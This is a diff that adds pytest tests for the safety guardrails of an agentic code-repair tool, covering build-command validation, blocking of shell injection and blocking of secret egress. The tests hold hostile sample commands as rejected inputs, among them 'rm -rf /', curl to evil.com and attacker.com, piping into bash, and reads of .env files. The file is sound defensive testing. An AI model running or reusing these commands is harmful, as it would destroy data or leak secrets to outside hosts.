@@ -140,13 +140,131 @@ def test_guardrailed_environment_redacts_credentials(tmp_path: Path):
 
 
 def test_auto_repair_config_defaults():
-    """Verify AutoRepairConfig defaults and customizations."""
+    """Verify AutoRepairConfig defaults to disabled for safety and enforces validation bounds."""
     cfg = AutoRepairConfig()
-    assert cfg.enabled is True
+    assert cfg.enabled is False
     assert cfg.trigger_mode == "automatic"
     assert cfg.build_command == "npm run build"
     assert cfg.max_steps == 10
     assert cfg.cost_limit_usd == 1.0
+
+    # Bounds validation tests
+    with pytest.raises(Exception):
+        AutoRepairConfig(max_steps=0)
+    with pytest.raises(Exception):
+        AutoRepairConfig(max_steps=31)
+    with pytest.raises(Exception):
+        AutoRepairConfig(cost_limit_usd=0.01)
+    with pytest.raises(Exception):
+        AutoRepairConfig(cost_limit_usd=15.0)
+
+
+def test_validate_build_command():
+    """Verify build command validation and shell injection prevention."""
+    from agent.remediation.agentic_repair import validate_build_command
+
+    assert validate_build_command("npm run build") == ["npm", "run", "build"]
+    assert validate_build_command("pytest tests/") == ["pytest", "tests/"]
+    assert validate_build_command("pnpm build") == ["pnpm", "build"]
+    assert validate_build_command("cargo build") == ["cargo", "build"]
+
+    # Reject shell chaining and injection
+    with pytest.raises(ValueError, match="disallowed operator"):
+        validate_build_command("npm run build; rm -rf /")
+    with pytest.raises(ValueError, match="disallowed operator"):
+        validate_build_command("npm run build && curl evil.com")
+    with pytest.raises(ValueError, match="disallowed operator"):
+        validate_build_command("npm run build | bash")
+    with pytest.raises(ValueError, match="disallowed operator"):
+        validate_build_command("npm run build > out.txt")
+
+    # Reject disallowed binaries
+    with pytest.raises(ValueError, match="Disallowed build command binary"):
+        validate_build_command("bash -c 'npm run build'")
+    with pytest.raises(ValueError, match="Disallowed build command binary"):
+        validate_build_command("curl evil.com/script.sh")
+
+
+def test_command_guardrails_enhanced():
+    """Verify advanced guardrails against .env reads, base64 secrets, pipes, and network egress."""
+    # Reading .env files
+    safe, reason = check_command_guardrails("cat .env")
+    assert not safe
+    assert "restricted pattern" in reason
+
+    safe, reason = check_command_guardrails("tail -n 20 '.env'")
+    assert not safe
+
+    # Piping to shell
+    safe, reason = check_command_guardrails("cat exploit.sh | bash")
+    assert not safe
+
+    # Git push / config
+    safe, reason = check_command_guardrails("git push origin main")
+    assert not safe
+
+    # Network egress (external vs localhost)
+    safe, reason = check_command_guardrails("curl https://attacker.com/leak")
+    assert not safe
+
+    # Localhost egress allowed
+    safe, reason = check_command_guardrails("curl http://localhost:3000/api/health")
+    assert safe
+    safe, reason = check_command_guardrails("curl http://127.0.0.1:8000/health")
+    assert safe
+
+    # Base64 encoded secret leak
+    import base64
+    secret = "SuperSecretTokenABC123"
+    b64_secret = base64.b64encode(secret.encode()).decode()
+    safe, reason = check_command_guardrails(f"echo {b64_secret} | tee /tmp/log", custom_secrets=[secret])
+    assert not safe
+    assert "contains encoded secret credentials" in reason
+
+
+def test_extract_git_diff_handles_renames(tmp_path: Path):
+    """Verify _extract_git_diff cleanly extracts renamed file destination paths."""
+    from unittest.mock import patch, MagicMock
+    engine = AgenticRepairEngine()
+
+    mock_status_out = (
+        " M web/src/app.tsx\n"
+        'R  web/src/old.tsx -> "web/src/new file.tsx"\n'
+        "?? web/src/untracked.ts\n"
+    )
+
+    with patch("subprocess.run") as mock_run:
+        # Mock git diff and git status --porcelain
+        mock_diff = MagicMock(returncode=0, stdout="diff --git a/x b/x")
+        mock_status = MagicMock(returncode=0, stdout=mock_status_out)
+        mock_run.side_effect = [mock_diff, mock_status]
+
+        diff_str, files = engine._extract_git_diff(tmp_path)
+        assert "web/src/app.tsx" in files
+        assert "web/src/new file.tsx" in files
+        assert "web/src/untracked.ts" in files
+        assert 'web/src/old.tsx -> "web/src/new file.tsx"' not in files
+
+
+def test_project_registry_register_and_caching():
+    """Verify ProjectRegistry.register caches and returns the ProjectRecord properly."""
+    from agent.projects.registry import ProjectRegistry
+
+    registry = ProjectRegistry()
+    record = registry.register("owner/repo", settings={"test": 123})
+    assert record is not None
+    assert record.repo_full_name == "owner/repo"
+    assert record.settings == {"test": 123}
+
+    # Verify cache lookup
+    cached = registry.get_by_repo("owner/repo")
+    assert cached is record
+
+    # Verify update_settings fallback for new repo
+    record2 = registry.update_settings("owner/new-repo", settings={"auto_repair": {"enabled": True}})
+    assert record2 is not None
+    assert record2.repo_full_name == "owner/new-repo"
+    assert record2.settings["auto_repair"]["enabled"] is True
 
 
 def test_agentic_repair_engine_handles_missing_workspace():
